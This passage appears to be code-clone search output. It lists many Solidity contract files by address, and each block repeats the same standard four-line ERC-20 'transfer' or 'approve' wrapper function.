    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="71" endline="74" pcid="8552">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="84" endline="87" pcid="822">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="74" endline="77" pcid="263">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="81" endline="84" pcid="5928">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="74" endline="77" pcid="4156">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefbd223978ababc08414ff766cf04028daa5266a.sol" startline="79" endline="82" pcid="8768">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="69" endline="72" pcid="2148">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x66bc620635dd4e5bebdc135489e7cb6f660b2064.sol" startline="77" endline="80" pcid="3842">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="85" endline="88" pcid="2422">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="82" endline="85" pcid="250">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="83" endline="86" pcid="310">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="70" endline="73" pcid="2823">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="71" endline="74" pcid="6686">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="81" endline="84" pcid="1164">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3bcddA8f67A88449e3a6aEA912f860F28DE1A03a.sol" startline="81" endline="84" pcid="2068">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="82" endline="85" pcid="2452">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="74" endline="77" pcid="7975">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25247a283047f964638be79886b61af12d3fe568.sol" startline="56" endline="59" pcid="1172">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="76" endline="79" pcid="4592">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="84" endline="87" pcid="1566">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="81" endline="84" pcid="6688">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x4115454c188acFB9Cb67c6d795214055381b53B5.sol" startline="85" endline="88" pcid="2407">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="75" endline="78" pcid="2051">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="34" endline="37" pcid="6697">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x545189e64a542b50e06902bceec0f536c662f46d.sol" startline="71" endline="74" pcid="3149">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x79868a92715cc6ba1829a46d292992d1c1945e6c.sol" startline="86" endline="89" pcid="4594">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x47BCDA0202Cf59825388c1Fbc6A03B52dd068121.sol" startline="74" endline="77" pcid="2704">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="74" endline="77" pcid="9230">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="84" endline="87" pcid="1887">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="70" endline="73" pcid="7836">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="80" endline="83" pcid="3908">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="75" endline="78" pcid="8708">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB95dAA5D1A88eD95C2d32f4b48A40c5cC48EDfed.sol" startline="46" endline="49" pcid="6699">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="74" endline="77" pcid="8440">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="75" endline="78" pcid="731">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE93B81908F25a136AEC81715E3673274d46D5b62.sol" startline="84" endline="87" pcid="8442">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="72" endline="75" pcid="1930">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="146" endline="149" pcid="373">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xDc41DbF96D3641d64D46C2a9D805B2a7eA804438.sol" startline="80" endline="83" pcid="7822">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="82" endline="85" pcid="1053">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="79" endline="82" pcid="8397">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="84" endline="87" pcid="3391">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="74" endline="77" pcid="1885">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="74" endline="77" pcid="4211">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="57" endline="60" pcid="8048">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="69" endline="72" pcid="8395">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="81" endline="84" pcid="6382">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x39Ac510d21f06A31e1bf897138E441661f1942a8.sol" startline="82" endline="85" pcid="1932">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaeE20ec596dC23E06aaDE3A2a2C7DD37A551bde7.sol" startline="71" endline="74" pcid="6380">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD779eC84BC7681f2d2c51799bCF0A362b5130044.sol" startline="81" endline="84" pcid="7701">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1B18679bc0F529e405e5838e94d9e09DA9386C1.sol" startline="73" endline="76" pcid="7473">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="71" endline="74" pcid="7266">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="83" endline="86" pcid="6092">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="81" endline="84" pcid="8554">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xf86c25675cd74be058a798894008ecf6a67dca21.sol" startline="73" endline="76" pcid="9044">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="72" endline="75" pcid="1051">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x11067Cc96F63B2b375fb740FEee95aA2009A5249.sol" startline="75" endline="78" pcid="449">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcc87B5c7F81B57BAE653eeb6a51265E305F85c2a.sol" startline="81" endline="84" pcid="7268">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="185" endline="188" pcid="379">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="75" endline="78" pcid="6718">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="75" endline="78" pcid="2303">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB9D25De4DC1E03a475f12ca3aAF1aFDC2407ea8e.sol" startline="85" endline="88" pcid="6720">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="144" endline="147" pcid="6730">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="73" endline="76" pcid="6090">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="73" endline="76" pcid="4607">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="83" endline="86" pcid="4609">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xBA2037B5dB212a0Ff8326af9Cb3cC3d906B15Dd8.sol" startline="183" endline="186" pcid="6736">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="74" endline="77" pcid="1564">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="81" endline="84" pcid="8382">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="83" endline="86" pcid="8884">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="68" endline="71" pcid="3728">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="81" endline="84" pcid="6077">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x059DCcB34DeD089dBCe4d1CCd975d6D38891e138.sol" startline="74" endline="77" pcid="161">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="84" endline="87" pcid="9232">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5D72b13F2b049d108CBc50b038dcC10904653d35.sol" startline="72" endline="75" pcid="3550">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="82" endline="85" pcid="6367">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="70" endline="73" pcid="97">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="84" endline="87" pcid="8755">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="72" endline="75" pcid="6365">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="81" endline="84" pcid="295">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x54D5cc9Ff426EFC848796Bd739c95BCF1Cc82447.sol" startline="172" endline="175" pcid="3166">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="72" endline="75" pcid="1184">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="79" endline="82" pcid="2513">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x341F7b39D375195870915b0744c90D3c6459EEdd.sol" startline="81" endline="84" pcid="1614">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="84" endline="87" pcid="7807">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="82" endline="85" pcid="1186">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="82" endline="85" pcid="5189">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="94" endline="97" pcid="7731">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="144" endline="147" pcid="3517">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="79" endline="82" pcid="6352">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="84" endline="87" pcid="7543">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa6AC064774bF25B7Ee251C3F051Aabf28A01DCb4.sol" startline="71" endline="74" pcid="6075">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="72" endline="75" pcid="5187">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5fae3af584495c5c2cbaa83740e55037a6633368.sol" startline="31" endline="34" pcid="3630">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="80" endline="83" pcid="99">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="73" endline="76" pcid="7166">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7b43aee5ca91412d54b6ee6b35a1708063e210f1.sol" startline="53" endline="56" pcid="4619">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="70" endline="73" pcid="3987">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaE940311F8bBFFfc2B198fFf5019b80b02a4F421.sol" startline="69" endline="72" pcid="6350">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="74" endline="77" pcid="7443">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19a64f43113e925223a9d76513727044e5160e70.sol" startline="64" endline="67" pcid="789">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdBE642963F5e8dF51Ccc6924B2bEfa8930149721.sol" startline="74" endline="77" pcid="7805">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5bf8D2aedA8ECE0373C4F0C5B28633DF3A5aB834.sol" startline="134" endline="137" pcid="3515">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x1553F94Cc349AaCa6c1f70707740e48d14f2632D.sol" startline="39" endline="42" pcid="605">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="82" endline="85" pcid="6337">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="69" endline="72" pcid="5334">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="79" endline="82" pcid="5336">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="30" endline="33" pcid="5342">
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="72" endline="75" pcid="434">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0000Db4632C8Ca4DD7E3C570397012cCBf57045b.sol" startline="37" endline="40" pcid="4">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9338e0a6861e995db04cea5b63e1b94faba2291c.sol" startline="35" endline="38" pcid="5343">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="82" endline="85" pcid="178">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xae68a4d3aED530bDfca9316fB3f757A8cd27a0e4.sol" startline="72" endline="75" pcid="6335">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="72" endline="75" pcid="5356">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x93641b862C7C657138896678Ab745592D7072C15.sol" startline="82" endline="85" pcid="5358">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="81" endline="84" pcid="1038">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="81" endline="84" pcid="5174">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="71" endline="74" pcid="5172">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="74" endline="77" pcid="4631">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x31106529aB0136C568C856A9A07dDbBAe8512865.sol" startline="81" endline="84" pcid="1551">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x35539cc6f1f1c0449474fdaaa0939893457163da.sol" startline="82" endline="85" pcid="1787">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="81" endline="84" pcid="667">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="83" endline="86" pcid="8602">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="81" endline="84" pcid="3459">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25CbbcDdc474eD95A5539C382ba6F486b2EB8D84.sol" startline="74" endline="77" pcid="1199">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfE0A4D6A16F934E3d595DB4b0D893071124CB693.sol" startline="79" endline="82" pcid="9295">
    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="70" endline="73" pcid="9178">
    function transfer(address to, uint256 amount) public returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19f9165689d09F3562419fE8b429735284cc37C0.sol" startline="74" endline="77" pcid="820">
